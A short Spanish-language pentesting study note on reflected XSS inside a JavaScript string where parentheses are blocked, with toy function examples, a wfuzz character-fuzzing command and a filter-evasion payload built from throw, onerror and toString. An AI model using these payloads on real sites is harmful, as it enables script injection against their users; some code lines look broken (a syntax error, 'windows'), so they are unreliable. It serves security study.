# XSS en javascript: con caracteres limitados  

Tags: #XSS #XSS-Reflected 

```javascript 
// Ejemplo para entender 

	//PoC1
	<script>
		function x(a, b){
			console.log(a+b);
		}
		x(5, 8)
	</script>


	//PoC2 agregando mas valores 
	// Como originalmente solo opera con dos valores, no deberia de mostrar los mas, pero si se puede hacer que la variable llamada 'myVar' cambie y muestre ese valor 
	<script>
		let myVar=3;
		function x(a, b){
			console.log(a+b);
		}
		x(5, myVar, 13, 7 myVar=18, 9);
		console.log(myVar);
	</script>
```

```javascript 
// Colocar expresiones en la url despues del parametro '?postid=1'

	'},{x:'   // En el backend al colocar la expresión así no dejará porque espera solo un valor numerico 
		' = %27 urlencodeada
	
❯ wfuzz -c /usr/share/Seclists/Fuzzing/special-chars.txt 'http://web.com/post?postId=1FUZZ%27},{x:%27'
	// El '& y #' son caracteres que permite la url sin corromperse 

	&'},{x:'
	&'},alert(1),{x:'      // El backend bloquea caracteres como '()'
	&'},x=x=>{throw/**/onerror=alert,1337},toString=x,windows + '',{x:'   // Forma de evadir 
		/**/ = Forma de generar un espacio 
		+ = '%2b' urlencodeado 
	&'},x=x=>{throw/**/onerror=alert,1337},toString=x,windows%2b'',{x:'


Notas:
	1. Al principio del código se esta cerrando una comilla y despues se abre una comilla para cerrar la segunda que existe en el código
	2. Se debe de usar un ataque de diccionario para encontrar caracteres especiales que evitan que la web se corrompa 
```